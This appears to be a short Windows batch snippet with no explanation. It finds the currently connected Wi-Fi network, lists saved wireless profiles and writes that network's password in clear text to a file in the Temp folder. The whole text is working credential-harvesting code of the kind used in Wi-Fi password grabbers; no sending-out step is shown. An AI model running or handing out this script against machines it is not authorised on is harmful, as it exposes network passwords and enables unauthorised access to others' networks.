cd AppData\Local\Temp
for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
netsh wlan show profile > key.txt
netsh wlan show profile %A% key=clear >> key.txt
